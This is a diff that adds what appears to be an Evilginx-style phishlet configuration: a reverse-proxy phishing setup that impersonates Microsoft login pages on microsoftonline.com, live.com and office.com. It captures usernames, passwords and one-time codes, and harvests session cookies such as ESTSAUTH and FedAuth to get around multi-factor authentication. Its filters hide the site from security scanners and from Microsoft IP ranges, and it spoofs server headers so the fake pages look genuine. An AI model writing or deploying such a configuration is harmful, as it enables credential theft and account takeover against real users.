@@ -1,0 +1,124 @@
+min_ver: "3.3.0"
+
+proxy_hosts:
+  - {
+      phish_sub: "secure",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      session: true,
+      is_landing: true,
+      ssl: true,
+      chain_ssl: true,
+    }
+  - {
+      phish_sub: "auth",
+      orig_sub: "login",
+      domain: "live.com",
+      session: true,
+      is_landing: false,
+      ssl: true,
+    }
+  - {
+      phish_sub: "portal",
+      orig_sub: "www",
+      domain: "office.com",
+      session: true,
+      is_landing: false,
+      ssl: true,
+    }
+
+auth_tokens:
+  - domain: ".live.com"
+    keys:
+      [
+        "ESTSAUTH",
+        "ESTSAUTHPERSISTENT",
+        "MSPAuth",
+        "MSPOK",
+        "MSCC",
+        "SignInStateCookie",
+      ]
+  - domain: "login.microsoftonline.com"
+    keys:
+      [
+        "MSAuthToken",
+        "fpc",
+        "stsservicecookie",
+        ".*_sessid",
+        "MSPAuth",
+        "MSPOK",
+      ]
+  - domain: ".office.com"
+    keys: ["FedAuth", "OfficeSessionToken", "MSAuth", ".*_sessionid"]
+
+credentials:
+  username:
+    key: "loginfmt"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "passwd"
+    search: "(.*)"
+    type: "post"
+  otp:
+    key: "otc"
+    search: "(.*)"
+    type: "post"
+
+sub_filters: [] # You can re-add your JS subfilters here after confirming base flow works
+
+filters:
+  - name: block_automation_tools
+    type: user-agent
+    action: deny
+    patterns:
+      - "(?i)(bot|crawler|scan|spider|burp|zap|nikto|python|curl|wget|postman|headless)"
+      - "HeadlessChrome"
+
+  - name: block_infrastructure_ips
+    type: ip
+    action: deny
+    patterns:
+      - "8.8.8.8/32"
+      - "1.1.1.1/32"
+      - "52.96.0.0/12"
+      - "104.16.0.0/13"
+      - "192.42.116.0/24"
+      - "20.190.128.0/18"
+      - "13.107.0.0/16"
+      - "34.0.0.0/8"
+
+  - name: block_high_risk_countries
+    type: geoip
+    action: deny
+    countries: ["RU", "CN", "IN"]
+
+  - name: prevent_bruteforce
+    type: rate-limit
+    requests: 4
+    interval: 90
+    action: redirect
+    redirect_url: "/error/429"
+
+security:
+  - name: fake_tech_headers
+    type: header
+    action: add
+    headers:
+      - "Server: Microsoft-IIS/10.0"
+      - "X-Powered-By: ASP.NET"
+
+  - name: security_headers
+    type: header
+    action: add
+    headers:
+      - "X-Frame-Options: DENY"
+      - "Content-Security-Policy: default-src 'self' *.microsoft.com *.microsoftonline.com *.live.com; script-src 'unsafe-inline' 'self' *.microsoft.com"
+      - "Referrer-Policy: strict-origin-when-cross-origin"
+      - "Permissions-Policy: geolocation=(), microphone=(), camera=()"
+
+login:
+  domain: "login.microsoftonline.com"
+  path: "/common/oauth2/v2.0/authorize"
+  delay: 1.5
+  max_attempts: 3
